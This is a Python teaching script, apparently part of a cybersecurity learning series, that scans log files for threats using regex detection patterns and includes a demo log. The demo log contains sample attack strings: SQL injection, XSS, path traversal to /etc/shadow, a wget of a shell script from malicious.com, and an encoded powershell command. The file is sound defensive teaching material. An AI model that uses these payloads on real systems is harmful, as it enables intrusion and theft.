# ============================================
#   LOG ANALYZER
# ============================================

import re
import os
import datetime
from collections import Counter

# ── Patterns to detect ────────────────────────────────────
PATTERNS = {
    "Failed Login":      r"(failed|failure|invalid|incorrect).{0,30}(login|password|auth|user)",
    "Brute Force":       r"(too many|multiple).{0,30}(attempt|fail|login)",
    "Root Access":       r"(root|sudo|su).{0,20}(login|access|attempt|session)",
    "Port Scan":         r"(port scan|portscan|nmap|masscan)",
    "SQL Injection":     r"(union.{0,10}select|drop.{0,10}table|insert.{0,10}into|' or '1)",
    "XSS Attempt":       r"(<script|onerror=|javascript:|alert\()",
    "Directory Traversal": r"(\.\./|\.\.\\|%2e%2e|%252e)",
    "Malware/Shell":     r"(wget|curl|chmod|/bin/sh|/bin/bash|cmd\.exe|powershell)",
    "Suspicious IP":     r"\b(10\.0\.0\.|192\.168\.|172\.1[6-9]\.|172\.2[0-9]\.)",
    "Error Spike":       r"(error|exception|critical|fatal|panic)",
}

# ── Sample log generator for demo ─────────────────────────
SAMPLE_LOGS = """2024-03-06 08:01:12 INFO  192.168.1.10 - User admin logged in successfully
2024-03-06 08:03:45 WARN  192.168.1.15 - Failed login attempt for user root
2024-03-06 08:03:46 WARN  192.168.1.15 - Failed login attempt for user root
2024-03-06 08:03:47 WARN  192.168.1.15 - Failed login attempt for user root
2024-03-06 08:03:48 WARN  192.168.1.15 - Failed login attempt for user admin
2024-03-06 08:03:49 WARN  192.168.1.15 - Failed login attempt for user admin
2024-03-06 08:03:50 ERROR 192.168.1.15 - Too many failed attempts - account locked
2024-03-06 08:10:22 INFO  10.0.0.5     - GET /index.html HTTP/1.1 200
2024-03-06 08:11:05 WARN  10.0.0.8     - GET /admin/../../../etc/passwd HTTP/1.1 403
2024-03-06 08:11:10 WARN  10.0.0.8     - GET /admin/../../../../etc/shadow HTTP/1.1 403
2024-03-06 08:12:33 ERROR 185.220.101.5 - SQL injection attempt: ' UNION SELECT * FROM users--
2024-03-06 08:12:45 ERROR 185.220.101.5 - SQL injection attempt: ' OR '1'='1
2024-03-06 08:13:00 WARN  185.220.101.5 - XSS attempt: <script>alert(1)</script>
2024-03-06 08:15:30 INFO  192.168.1.20 - sudo su - root session opened
2024-03-06 08:20:11 ERROR 203.0.113.42 - Port scan detected from remote host
2024-03-06 08:20:12 ERROR 203.0.113.42 - Nmap scan signatures detected
2024-03-06 08:22:00 WARN  203.0.113.42 - wget http://malicious.com/shell.sh
2024-03-06 08:25:44 INFO  192.168.1.10 - User admin logged out
2024-03-06 08:30:00 INFO  192.168.1.30 - Backup completed successfully
2024-03-06 09:00:01 ERROR 10.0.0.99    - Critical error in authentication module
2024-03-06 09:01:15 WARN  10.0.0.99    - Exception: database connection failed
2024-03-06 09:01:16 WARN  10.0.0.99    - Exception: database connection failed
2024-03-06 09:01:17 FATAL 10.0.0.99    - Panic: system overload detected
2024-03-06 09:05:00 INFO  192.168.1.10 - User john logged in successfully
2024-03-06 09:10:22 WARN  172.16.0.55  - Failed login attempt for user administrator
2024-03-06 09:10:23 WARN  172.16.0.55  - Failed login attempt for user administrator
2024-03-06 09:10:24 WARN  172.16.0.55  - Failed login attempt for user sa
2024-03-06 09:15:00 INFO  192.168.1.10 - File upload completed: report.pdf
2024-03-06 09:20:33 ERROR 45.33.32.156 - powershell -enc base64encodedpayload
2024-03-06 09:25:00 INFO  192.168.1.10 - User john logged out"""


def display_banner():
    print("\n" + "="*55)
    print("   LOG ANALYZER - THREAT DETECTION")
    print("="*55)
    print("   Project 7 - Cybersecurity Learning Series")
    print("="*55)


def display_menu():
    print("\n  What would you like to do?")
    print("  [1] Analyze a log file")
    print("  [2] Analyze sample logs (demo)")
    print("  [3] Generate sample log file")
    print("  [4] Learn about Log Analysis")
    print("  [5] Exit")


def extract_ip(line):
    """Extract first IP address from a log line."""
    match = re.search(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b', line)
    return match.group(1) if match else "unknown"


def extract_level(line):
    """Extract log level from a line."""
    for level in ["FATAL", "CRITICAL", "ERROR", "WARN", "INFO", "DEBUG"]:
        if level in line.upper():
            return level
    return "UNKNOWN"


def detect_brute_force(lines, threshold=3):
    """Detect brute force by counting repeated failed logins per IP."""
    ip_fails = Counter()
    brute_force_ips = []

    for line in lines:
        if re.search(PATTERNS["Failed Login"], line, re.IGNORECASE):
            ip = extract_ip(line)
            if ip != "unknown":
                ip_fails[ip] += 1

    for ip, count in ip_fails.items():
        if count >= threshold:
            brute_force_ips.append((ip, count))

    return sorted(brute_force_ips, key=lambda x: x[1], reverse=True)


def analyze_logs(lines, source_name="log"):
    """Full analysis of log lines."""
    print(f"\n  Analyzing {len(lines)} log entries from: {source_name}")
    print("  " + "-"*55)

    # ── Basic stats ────────────────────────────────────────
    levels = Counter(extract_level(line) for line in lines)
    all_ips = [extract_ip(line) for line in lines]
    ip_counts = Counter(ip for ip in all_ips if ip != "unknown")

    print(f"\n  OVERVIEW")
    print(f"  {'Total lines':<30} {len(lines)}")
    for level in ["FATAL", "CRITICAL", "ERROR", "WARN", "INFO"]:
        if levels[level] > 0:
            bar = "#" * min(levels[level], 30)
            print(f"  {level:<30} {levels[level]:<5} {bar}")

    # ── Threat detection ───────────────────────────────────
    print(f"\n  THREAT DETECTION")
    print("  " + "-"*55)

    threats_found = []

    for threat_name, pattern in PATTERNS.items():
        matches = [line for line in lines if re.search(pattern, line, re.IGNORECASE)]
        if matches:
            threats_found.append((threat_name, matches))
            print(f"\n  [{threat_name}] - {len(matches)} occurrence(s) found:")
            for match in matches[:3]:  # Show first 3
                print(f"    >> {match.strip()[:90]}")
            if len(matches) > 3:
                print(f"    ... and {len(matches) - 3} more")

    if not threats_found:
        print("  No threats detected - logs appear clean!")

    # ── Brute force detection ──────────────────────────────
    brute_force = detect_brute_force(lines)
    if brute_force:
        print(f"\n  BRUTE FORCE DETECTION")
        print("  " + "-"*55)
        for ip, count in brute_force:
            print(f"  {ip:<20} {count} failed login attempts  *** HIGH RISK ***")

    # ── Top IPs ────────────────────────────────────────────
    print(f"\n  TOP 5 MOST ACTIVE IPs")
    print("  " + "-"*55)
    for ip, count in ip_counts.most_common(5):
        bar = "#" * min(count, 25)
        print(f"  {ip:<20} {count:<5} {bar}")

    # ── Timeline ───────────────────────────────────────────
    timestamps = []
    for line in lines:
        match = re.search(r'\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}', line)
        if match:
            try:
                timestamps.append(datetime.datetime.strptime(match.group(), "%Y-%m-%d %H:%M:%S"))
            except:
                pass

    if timestamps:
        print(f"\n  TIMELINE")
        print("  " + "-"*55)
        print(f"  First event : {min(timestamps).strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  Last event  : {max(timestamps).strftime('%Y-%m-%d %H:%M:%S')}")
        duration = max(timestamps) - min(timestamps)
        print(f"  Duration    : {duration}")

    # ── Summary ────────────────────────────────────────────
    total_threats = sum(len(m) for _, m in threats_found)
    print(f"\n  " + "="*55)
    print(f"  SUMMARY")
    print(f"  " + "="*55)
    print(f"  Threat types detected : {len(threats_found)}")
    print(f"  Total threat events   : {total_threats}")
    print(f"  Brute force IPs       : {len(brute_force)}")
    print(f"  Unique IPs seen       : {len(ip_counts)}")

    if total_threats == 0:
        risk = "LOW - Logs appear clean"
    elif total_threats <= 5:
        risk = "MEDIUM - Some suspicious activity"
    elif total_threats <= 15:
        risk = "HIGH - Multiple threats detected"
    else:
        risk = "CRITICAL - Under active attack!"

    print(f"  Risk Level            : {risk}")
    print(f"  " + "="*55)


def analyze_file(filepath):
    """Read and analyze a log file."""
    if not os.path.exists(filepath):
        print(f"\n  File not found: {filepath}")
        return

    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.strip() for line in f.readlines() if line.strip()]
        analyze_logs(lines, source_name=filepath)
    except Exception as e:
        print(f"\n  Error reading file: {e}")


def generate_sample_file():
    """Generate a sample log file to analyze."""
    filename = "sample_logs.txt"
    with open(filename, "w") as f:
        f.write(SAMPLE_LOGS)
    print(f"\n  Sample log file created: {filename}")
    print(f"  You can now analyze it using option 1!")
    print(f"  Or open it in VS Code to see what logs look like.")


def learn_mode():
    print("""
  HOW LOG ANALYSIS WORKS
  ======================

  WHAT ARE LOGS?
  Every system, server, and application records
  what it does in LOG FILES. They are like a
  diary of everything that happened.

  WHAT LOGS CONTAIN:
    - Timestamp  : When something happened
    - Level      : INFO, WARN, ERROR, FATAL
    - IP Address : Who was involved
    - Message    : What actually happened

  EXAMPLE LOG LINE:
  2024-03-06 08:03:45 WARN 192.168.1.15 - Failed login for root

  LOG LEVELS:
    INFO     -> Normal activity, nothing wrong
    WARN     -> Something unusual, watch it
    ERROR    -> Something went wrong
    CRITICAL -> Serious problem
    FATAL    -> System is crashing

  WHAT ANALYSTS LOOK FOR:
    Brute Force  -> Many failed logins from one IP
    SQLi / XSS   -> Attack strings in web requests
    Port Scans   -> One IP hitting many ports fast
    Privilege Esc-> Attempts to gain root/admin
    Data Exfil   -> Large outbound data transfers
    Malware      -> wget/curl downloading scripts

  BRUTE FORCE DETECTION:
    If one IP fails to login 5+ times in a short
    period, it is likely a brute force attack.
    Real systems auto-block IPs after 3-5 failures.

  REAL TOOLS USED BY SOC ANALYSTS:
    Splunk     -> Enterprise log analysis platform
    ELK Stack  -> Elasticsearch + Logstash + Kibana
    Graylog    -> Open source log management
    Wazuh      -> Open source SIEM platform

  This project is a simple version of these tools!

  SOC = Security Operations Center
  SIEM = Security Info and Event Management
    """)


def main():
    display_banner()

    while True:
        display_menu()
        choice = input("\n  Choose an option (1-5): ").strip()

        if choice == "1":
            filepath = input("\n  Enter log file path: ").strip()
            # Remove quotes if user dragged file in
            filepath = filepath.strip('"').strip("'")
            analyze_file(filepath)

        elif choice == "2":
            lines = [l.strip() for l in SAMPLE_LOGS.strip().split("\n") if l.strip()]
            analyze_logs(lines, source_name="sample_logs (demo)")

        elif choice == "3":
            generate_sample_file()

        elif choice == "4":
            learn_mode()

        elif choice == "5":
            print("\n  Goodbye! You have completed all 7 projects!\n")
            break

        else:
            print("\n  Invalid option. Please choose 1-5.")

        input("\n  Press Enter to continue...")


if __name__ == "__main__":
    main()